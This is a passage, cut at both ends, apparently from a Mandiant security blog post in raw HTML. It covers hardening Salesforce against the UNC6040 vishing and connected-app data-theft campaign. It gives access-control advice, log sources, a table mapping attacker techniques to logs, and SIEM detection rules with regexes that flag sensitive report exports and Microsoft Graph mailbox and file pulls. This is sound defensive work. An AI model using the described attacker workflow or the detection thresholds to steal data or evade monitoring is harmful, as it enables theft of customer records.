baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Grant privileges via Permission Sets:</strong><span style=\"vertical-align: baseline;\"> Grant all additional access through well-defined Permission Sets based on job roles, rather than creating numerous custom profiles. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Disable API access for non-essential users:</strong><span style=\"vertical-align: baseline;\"> The \"API Enabled\" permission is required for tools like Data Loader. Remove this permission from all user profiles and grant it only via a controlled Permission Set to a small number of justified users.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hide the 'Setup' menu from non-admin users:</strong><span style=\"vertical-align: baseline;\"> For all non-administrator profiles, remove access to the administrative \"Setup\" menu to prevent unauthorized configuration changes.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Enforce high-assurance sessions for sensitive actions: </strong><span style=\"vertical-align: baseline;\">Configure session settings to require a high-assurance session for sensitive operations such as exporting reports.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">See <a href=\"https://help.salesforce.com/s/articleView?id=xcloud.admin_sessions.htm&amp;type=5\" rel=\"noopener\" target=\"_blank\">Salesforce guidance on modifying session security settings</a>.</span></p>\n<p><span style=\"vertical-align: baseline;\">See <a href=\"https://help.salesforce.com/s/articleView?id=sf.security_auth_require_ha_session.htm&amp;language=en_US\" rel=\"noopener\" target=\"_blank\">Salesforce guidance on requiring high-assurance session security</a>.</span></p>\n<p><span style=\"vertical-align: baseline;\">See <a href=\"https://help.salesforce.com/s/articleView?id=platform.users_profiles_view_all_mod_all.htm&amp;type=5\" rel=\"noopener\" target=\"_blank\">Salesforce guidance on \"View All\" and \"Modify All\" permissions</a>.</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\"> </span></p>\n<h5><span style=\"vertical-align: baseline;\">Granular Data Access Policies</span></h5>\n<h6><span style=\"vertical-align: baseline;\">Enforce \"Private\" Organization-Wide Sharing Defaults (OWD)</span></h6>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Set the internal and external </span><strong style=\"vertical-align: baseline;\">Organization-Wide Defaults (OWD)</strong><span style=\"vertical-align: baseline;\"> to </span><strong style=\"vertical-align: baseline;\">\"Private\"</strong><span style=\"vertical-align: baseline;\"> for all sensitive objects.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Use strategic Sharing Rules or other sharing mechanisms to grant wider data access, rather than relying on broad access via the Role Hierarchy.</span></p>\n</li>\n</ul>\n<h6><span style=\"vertical-align: baseline;\">Leverage Restriction Rules for Row-Level Security</span></h6>\n<p><span style=\"vertical-align: baseline;\">Restriction Rules act as a filter that is applied on top of all other sharing settings, allowing for fine-grained control over which records a user can see.</span></p>\n<p><span style=\"vertical-align: baseline;\">See <a href=\"https://help.salesforce.com/s/articleView?id=platform.security_restriction_rule.htm&amp;language=en_US&amp;type=5\" rel=\"noopener\" target=\"_blank\">Salesforce guidance on restriction rules</a>.</span></p>\n<h6><span style=\"vertical-align: baseline;\">Revoke Salesforce Support Login Access</span></h6>\n<p><span style=\"vertical-align: baseline;\">Ensure that any users with access to sensitive data or with privileged access to the underlying Salesforce instance are setting strict timeouts on any Salesforce support access grants.</span></p>\n<p><span style=\"vertical-align: baseline;\">Revoke any standing requests and only re-enable with strict time limits for specific use cases. Be wary of enabling these grants from administrative accounts.</span></p>\n<p><span style=\"vertical-align: baseline;\">See <a href=\"https://help.salesforce.com/s/articleView?id=000384334&amp;type=1\" rel=\"noopener\" target=\"_blank\">Salesforce guidance on granting Salesforce Support login access</a>. </span></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant recommends running the </span><a href=\"https://help.salesforce.com/s/articleView?id=sf.security_health_check.htm&amp;language=en_US&amp;type=5\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Salesforce Security Health Check</span></a><span style=\"vertical-align: baseline;\"> tool to identify and address misconfigurations. For additional hardening recommendations, reference the </span><a href=\"https://resources.docs.salesforce.com/latest/latest/en-us/sfdc/pdf/salesforce_security_impl_guide.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Salesforce Security Guide</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">3. Logging and Detections</span></h4>\n<h5><span style=\"vertical-align: baseline;\">Salesforce Targeted Logging and Detections Controls</span><strong style=\"vertical-align: baseline;\"> </strong></h5>\n<p><span style=\"vertical-align: baseline;\">This section outlines key logging and detection strategies for Salesforce instances. These controls are essential for identifying and responding to advanced threats within the SaaS environment.</span></p>\n<h5><span style=\"vertical-align: baseline;\">SaaS Applications Logging</span><strong style=\"vertical-align: baseline;\"> </strong></h5>\n<p><span style=\"vertical-align: baseline;\">To gain visibility into the tactics, techniques, and procedures (TTPs) used by threat actors against SaaS Applications, Mandiant recommends enabling critical log types in the organization's Salesforce environment and ingesting the logs into their Security Information and Event Management (SIEM).</span></p>\n<h5><span style=\"vertical-align: baseline;\">What You Need in Place Before Logging</span></h5>\n<p><span style=\"vertical-align: baseline;\">Before you turn on collection or write detections, make sure your organization is actually entitled to the logs you are planning to use - and that the right features are enabled. </span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Entitlement check (must-have) </strong></p>\n</li>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Most security logs/features are gated behind Event Monitoring via Salesforce Shield or the Event Monitoring Add-On. This applies to Real-Time Event Monitoring (RTEM) streaming and viewing.</span></p>\n</li>\n</ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Pick your data model per use case</strong></p>\n</li>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">RTEM - Streams (near real-time alerting): Available in Enterprise/Unlimited/Developer subscriptions; streaming events retained ~3 days.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">RTEM - Storage: Many are Big Objects (native storage); some are standard objects (e.g. Threat Detection stores)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Event Log Files (ELF) - CSV model (batch exports): Available in Enterprise/Performance/Unlimited editions.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Event Log Objects (ELO) - SOQL model (queryable history): Shield/add-on required.</span></p>\n</li>\n</ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Turn on what you need (and scope access)</strong></p>\n</li>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Use Event Manager to enable/disable streaming and storing per event; viewing RTEM events.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Grant access via profiles/permissions sets for RTEM and Threat Detection UI.</span></p>\n</li>\n</ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Threat Detection &amp; ETS</strong></p>\n</li>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Threat Detection events are viewed in UI with Shield/add-on; stored in corresponding </span><span style=\"font-style: italic; vertical-align: baseline;\">EventStore</span><span style=\"vertical-align: baseline;\"> objects.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"> Enhanced Transaction Security (ETS) is included with RTEM for block/MFA/notify actions on real-time events.</span></p>\n</li>\n</ol>\n</ol>\n<h5><span style=\"vertical-align: baseline;\">Recommended Log Sources to Monitor</span></h5>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Login History (LoginHistory)</strong><span style=\"vertical-align: baseline;\">: Tracks all login attempts, including username, time, IP address, status (successful/failed), and client type. This allows you to identify unusual login times, unknown locations, or repeated failures, which could indicate credential stuffing or account compromise.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Login Events (LoginEventStream)</strong><span style=\"vertical-align: baseline;\">: LoginEvent tracks the login activity of users who log in to Salesforce.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Setup Audit Trail (SetupAuditTrail)</strong><span style=\"vertical-align: baseline;\">: Records administrative and configuration changes within your Salesforce environment. This helps track changes made to permissions, security settings, and other critical configurations, facilitating auditing and compliance efforts.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">API Calls (ApiEventStream)</strong><span style=\"vertical-align: baseline;\">: Monitors API usage and potential misuse by tracking calls made by users or connected apps.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Report Exports (ReportEventStream)</strong><span style=\"vertical-align: baseline;\">: Provides insights into report downloads, helping to detect potential data exfiltration attempts.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">List View Events (ListViewEventStream)</strong><span style=\"vertical-align: baseline;\">: Tracks user interaction with list views, including access and manipulation of data within those views.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Bulk API Events (BulkApiResultEvent)</strong><span style=\"vertical-align: baseline;\">: Track when a user downloads the results of a Bulk API request.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Permission Changes (PermissionSetEvent)</strong><span style=\"vertical-align: baseline;\">: Tracks changes to permission sets and permission set groups. This event initiates when a permission is added to, or removed from a permission set. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">API Anomaly (ApiAnomalyEvent)</strong><span style=\"vertical-align: baseline;\">: Track anomalies in how users make API calls. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Unique Query Event Type</strong><span style=\"vertical-align: baseline;\">: Unique Query events capture specific search queries (SOQL), filter IDs, and report IDs that are processed, along with the underlying database queries (SQL).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">External Identity Provider Event Logs</strong><span style=\"vertical-align: baseline;\">: Track information from login attempts using SSO. </span><strong style=\"vertical-align: baseline;\">(Please follow the guidance provided by your Identity Provider for monitoring and collecting IdP event logs.)</strong></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">These log sources will provide organizations with the logging capabilities to properly collect and monitor the common TTPs used by threat actors. The key log sources to monitor and observable Salesforce activities for each TTP are as follows:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">TTP</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Observable Salesforce Activities</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Log Sources</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Vishing</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Suspicious login attempts (rapid failures).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Logins from unusual IPs/ASNs (e.g., Mullvad/Tor). </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">OAuth (“Remote Access 2.0”) from unrecognized clients.</span></p>\n</li>\n</ul>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Login History </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">LoginEventStream/LoginEvent</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Setup Audit Trail</span></p>\n</li>\n</ul>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Malicious Connected App Authorization </strong><span style=\"vertical-align: baseline;\">(e.g., Data Loader, custom scripts)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">New Connected App creation/modification (broad scopes: api, refresh_token, offline_access). </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Policy relaxations (Permitted Users, IP restrictions). </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Granting of API Enabled / “Manage Connected Apps” via perms.</span></p>\n</li>\n</ul>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Setup Audit Trail  </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">PermissionSetEvent </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">LoginEventStream/LoginEvent (OAuth)</span></p>\n</li>\n</ul>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Data Exfiltration</strong><span style=\"vertical-align: baseline;\"> (via API, Data Loader, reports)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">High-rate Query/QueryMore/QueryAll bursts. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Large RowsProcessed/RecordCount in reports &amp; list views (chunked).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Bulk job result downloads. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">File/attachment downloads at scale</span></p>\n</li>\n</ul>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">ApiEventStream/ApiEvent  </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">ReportEventStream/ReportEvent  </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">ListViewEventStream/ListViewEvent  </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">BulkApiResultEvent  </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">FileEvent/FileEventStore  </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">ApiAnomalyEvent/ReportAnomalyEvent</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Unique Query Event Type</span></p>\n</li>\n</ul>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Lateral Movement/Persistence </strong><span style=\"vertical-align: baseline;\">(within Salesforce or to other cloud platforms)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Permissions elevated (e.g., View/Modify All Data, API Enabled).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">New user/service accounts. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">LoginAs activity. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Logins from VPN/Tor after SF OAuth.  </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Pivots to Okta/M365, then Graph data pulls.</span></p>\n</li>\n</ul>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Setup Audit Trail  </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">PermissionSetEvent  </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">LoginAsEventStream  </span></p>\n</li>\n</ul>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h5><span style=\"vertical-align: baseline;\">SaaS Applications Detections</span><strong style=\"vertical-align: baseline;\">  </strong></h5>\n<p><span style=\"vertical-align: baseline;\">While native SIEM threat detections provide some protection, they often lack the centralized visibility needed to connect disparate events across a complex environment. By developing custom targeted detection rules, organizations can proactively detect malicious activities. </span></p>\n<h6><span style=\"vertical-align: baseline;\">Data Exfiltration &amp; Cross-SaaS Lateral Movement (Post-Authorization)</span><strong style=\"vertical-align: baseline;\"> </strong></h6>\n<p><span style=\"vertical-align: baseline;\">MITRE Mapping: TA0010 - Exfiltration &amp; TA0008 - Lateral Movement</span></p>\n<h6><span style=\"vertical-align: baseline;\">Scenario &amp; Objectives</span></h6>\n<p><span style=\"vertical-align: baseline;\">After an user authorizes a (malicious or spoofed) Connected App, UNC6040 typically:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Performs data exfiltration quickly (REST pagination bursts, Bulk API downloads, lards/sensitive report exports).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Pivots to Okta/Microsoft 365 from the same risky egress IP to expand access and steal more data. </span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">The objective here is to detect Salesforce OAuth → Exfil within ≤10 minutes, and Salesforce OAuth → Okta/M365 login within ≤60 minutes (same risky IP), plus single-signal, low-noise exfil patterns.</span></p>\n<h6><span style=\"vertical-align: baseline;\">Baseline &amp; Allowlist</span></h6>\n<p><span style=\"vertical-align: baseline;\">Re-use the lists you already maintain for the vishing phase and add two regex helpers for content focus.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">STRING</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">ALLOWLIST_CONNECTED_APP_NAMES </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">KNOWN_INTEGRATION_USERS (user ids/emails that legitimately use OAuth)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">VPN_TOR_ASNS (ASNs as strings)</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">CIDR</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">ENTERPRISE_EGRESS_CIDRS (your corporate/VPN public egress)</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">REGEX</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">SENSITIVE_REPORT_REGEX</span></p>\n</li>\n</ul>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>(?i)\\b(all|export|dump)\\b.*\\b(contact|lead|account|customer|pii|email|phone|ssn)\\b</code></pre></div>\n<div class=\"block-paragraph_advanced\"><ul>\n<li>\n<ul>\n<li><span style=\"vertical-align: baseline;\">M365_SENSITIVE_GRAPH_REGEX</span></li>\n</ul>\n</li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>(?i)^https?://graph\\.microsoft\\.com/(beta|v1\\.0)/(users|me)/messages\n(?i)^https?://graph\\.microsoft\\.com/(beta|v1\\.0)/drives/.*/items/.*/content\n(?i)^https?://graph\\.microsoft\\.com/(beta|v1\\.0)/reports/\n(?i)^https?://graph\\.microsoft\\.com/(beta|v1\\.0)/users(\\?|$)</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h5><span style=\"vertical-align: baseline;\">High Fidelity Detection Catalog (Pseudo-Code)</span></h5>\n<h6><span style=\"vertical-align: baseline;\">Salesforce OAuth → Data Exfil in ≤10 Minutes (Multi-Event)</span></h6>\n<p><span style=\"vertical-align: baseline;\">Suspicious OAuth followed within 10m by Bulk result download, REST pagination burst, or sensitive/large report export by the same user.</span></p>\n<p><span style=\"vertical-align: baseline;\">Why high-fidelity: Matches UNC6040’s “approve → drain” pattern; tight window + volume thresholds.</span></p>\n<p><span style=\"vertical-align: baseline;\">Key signals:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">OAuth success (unknown app OR allowlisted+risky egress), bind on user.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Then any of:</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">BulkApiResultEvent with big RowsProcessed/RecordCount</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">ApiEventStream many query/queryMore calls</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">ReportEventStream large/sensitive report export</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Lists/knobs: ENTERPRISE_EGRESS_CIDRS, VPN_TOR_ASNS, SENSITIVE_REPORT_REGEX.</span></p>\n</li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>$oauth.metadata.product_name = \"SALESFORCE\"\n$oauth.metadata.log_type = \"SALESFORCE\"\n$oauth.extracted.fields[\"LoginType\"] = \"Remote Access 2.0\"\n($oauth.extracted.fields[\"Status\"] = \"Success\" or $oauth.security_result.action_details = \"Success\")\n( not ($app in %ALLOWLIST_CONNECTED_APP_NAMES)\nor ( ($app in %ALLOWLIST_CONNECTED_APP_NAMES)\nand ( not ($ip in cidr %ENTERPRISE_EGRESS_CIDRS)\nor strings.concat(ip_to_asn($ip), \"\") in %VPN_TOR_ASNS ) ) )\n$uid = coalesce($oauth.principal.user.userid, $oauth.extracted.fields[\"UserId\"])\n\n$bulk.metadata.product_name = \"SALESFORCE\"\n$bulk.metadata.log_type = \"SALESFORCE\"\n$bulk.metadata.product_event_type = \"BulkApiResultEvent\"\n$uid = coalesce($bulk.principal.user.userid, $bulk.extracted.fields[\"UserId\"])\n\nmatch:\n$uid over 10m</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p>Or</p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>$oauth.metadata.product_name = \"SALESFORCE\"\n$oauth.metadata.log_type = \"SALESFORCE\"\n$oauth.extracted.fields[\"LoginType\"] = \"Remote Access 2.0\"\n($oauth.extracted.fields[\"Status\"] = \"Success\" or $oauth.security_result.action_details = \"Success\")\n( not ($app in %ALLOWLIST_CONNECTED_APP_NAMES)\nor ( ($app in %ALLOWLIST_CONNECTED_APP_NAMES)\nand ( not ($ip in cidr %ENTERPRISE_EGRESS_CIDRS)\nor strings.concat(ip_to_asn($ip), \"\") in %VPN_TOR_ASNS ) ) )\n$uid = coalesce($oauth.principal.user.userid, $oauth.extracted.fields[\"UserId\"])\n\n$api.metadata.product_name = \"SALESFORCE\"\n$api.metadata.log_type = \"SALESFORCE\"\n$api.metadata.product_event_type = \"ApiEventStream\"\n$uid = coalesce($api.principal.user.userid, $api.extracted.fields[\"UserId\"])\n\nmatch:\n$uid over 10m</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p>Or</p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>$oauth.metadata.product_name = \"SALESFORCE\"\n$oauth.metadata.log_type = \"SALESFORCE\"\n$oauth.extracted.fields[\"LoginType\"] = \"Remote Access 2.0\"\n($oauth.extracted.fields[\"Status\"] = \"Success\" or $oauth.security_result.action_details = \"Success\")\n( not ($app in %ALLOWLIST_CONNECTED_APP_NAMES)\nor ( ($app in %ALLOWLIST_CONNECTED_APP_NAMES)\nand ( not ($ip in cidr %ENTERPRISE_EGRESS_CIDRS)\nor strings.concat(ip_to_asn($ip), \"\") in %VPN_TOR_ASNS ) ) )\n$uid = coalesce($oauth.principal.user.userid, $oauth.extracted.fields[\"UserId\"])\n\n$report.metadata.product_name = \"SALESFORCE\"\n$report.metadata.log_type = \"SALESFORCE\"\n$report.metadata.product_event_type = \"ReportEventStream\"\nstrings.to_lower(coalesce($report.extracted.fields[\"ReportName\"], \"\")) in regex SENSITIVE_REPORT_REGEX\n$uid = coalesce($report.principal.user.userid, $report.extracted.fields[\"UserId\"])\n\nmatch:\n$uid over 10m</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\"><strong>Note:</strong> Single event rule can also be used instead of multi-event rules in this case where only the Product Event Types like ApiEventStream, BulkApiResultEvent, ReportEventStream can be used as a single event rule to be monitored. But, care has to be taken if a single event rule is established as these can be very noisy, and thus the reference lists should be actively monitored.</span></p>\n<h6><span style=\"vertical-align: baseline;\">Bulk API Large Result Download (Non-Integration User)</span></h6>\n<p><span style=\"vertical-align: baseline;\">Bulk API/Bulk v2 result download above threshold by a human user.</span></p>\n<p><span style=\"vertical-align: baseline;\">Why high-fidelity: Clear exfil artifact.</span></p>\n<p><span style=\"vertical-align: baseline;\">Key signals: BulkApiResultEvent, user not in KNOWN_INTEGRATION_USERS.</span></p>\n<p><span style=\"vertical-align: baseline;\">Lists/knobs: KNOWN_INTEGRATION_USERS, size threshold.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>$e.metadata.product_name = \"SALESFORCE\"\n$e.metadata.log_type = \"SALESFORCE\"\n$e.metadata.product_event_type = \"BulkApiResultEvent\"\nnot (coalesce($e.principal.user.userid, $e.extracted.fields[\"UserId\"]) in %KNOWN_INTEGRATION_USERS)</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h6><span style=\"vertical-align: baseline;\">REST Query Pagination Burst (query/queryMore)</span></h6>\n<p><span style=\"vertical-align: baseline;\">High-rate query*/queryMore calls over a short window.</span></p>\n<p><span style=\"vertical-align: baseline;\">Why high-fidelity: Mimics scripted drains; steady human usage won’t hit burst thresholds.</span></p>\n<p><span style=\"vertical-align: baseline;\">Key signals: ApiEventStream, Operation in query, queryMore, query_all, queryall, count ≥ threshold in 10m, user not in KNOWN_INTEGRATION_USERS.</span></p>\n<p><span style=\"vertical-align: baseline;\">Lists/knobs: burst threshold, KNOWN_INTEGRATION_USERS.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>$api.metadata.product_name = 